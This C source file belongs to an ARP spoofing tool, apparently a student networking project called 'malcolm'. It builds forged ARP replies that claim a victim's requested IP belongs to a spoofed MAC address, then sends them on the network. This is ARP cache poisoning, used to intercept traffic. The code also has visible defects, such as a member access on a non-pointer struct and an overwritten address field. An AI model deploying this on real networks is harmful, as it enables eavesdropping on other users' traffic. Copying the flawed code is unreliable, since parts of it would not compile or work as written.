#include "malcolm.h"

static void	display_addr(t_arp *arp)
{
	char		*mac;
	char		*ip;

	printf("Sending an ARP reply to the target address with spoofed source\n");
	mac = mac_strconv(arp->sender_mac);
	ip = ip_strconv(arp->sender_ip);
	printf("\tsource mac address : %s\n"
			"\tsource IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);
	mac = mac_strconv(arp->target_mac);
	ip = ip_strconv(arp->target_ip);
	printf("\ttarget mac address : %s\n"
			"\ttarget IP address : %s\n", mac, ip);
	ft_multifree(&mac, &ip, NULL);
}

static t_arp	*fill_arp(t_malcolm *mal, t_arp *arp, t_arp *bef)
{
	uint64_t	empty;

	empty = 0;
	ft_memcpy(arp->d_mac, bef->sender_mac, MAC_LEN);
	set_mac_addr(mal->s_maddr, arp->s_mac, MAC_LEN);

	arp->etype = htons(ETHERTYPE_ARP);
	arp->htype = htons(1);
	arp->ptype = htons(ETHERTYPE_IP);
	//arp->hlen = ETHER_ADDR_LEN;
	arp->hlen = MAC_LEN;
	arp->plen = IP_LEN;
	arp->opcode = htons(ARPOP_REPLY);

	set_mac_addr(mal->s_maddr, arp->sender_mac, MAC_LEN);
	ft_memcpy(arp->sender_ip, bef->target_ip, IP_LEN);

	ft_memcpy(arp->target_mac, (uint8_t *)&empty, MAC_LEN);
	ft_memcpy(arp->target_ip, bef->sender_ip, IP_LEN);

	ft_bzero(arp->padding, 18);

	return (arp);
}
void	send_arp(t_malcolm *mal, char *recvbuf)
{
	ssize_t		ret;
	t_arp		*arp;
	t_arp		*bef;
	char		buf[BUFSIZE];


	bef = (t_arp *)(recvbuf);
	arp = (t_arp *)buf;
	fill_arp(mal, arp, bef);
	display_addr(arp);

	struct sockaddr lala;
	struct sockaddr_in *toto;
	toto = (struct sockaddr_in *)&lala;
	ft_memcpy(&toto->sin_addr.s_addr, arp->target_ip, IP_LEN);
	ft_strcpy(lala->sa_data, mal->ifa->ifa_name);
	toto->sin_family = AF_INET;

	ret = sendto(mal->sockfd, buf, sizeof(t_arp), 0, &lala, sizeof(lala));
	printf("Sent an ARP reply packet (%ld bytes)\n", ret);
	printf("error : %s\n", strerror(errno));
}
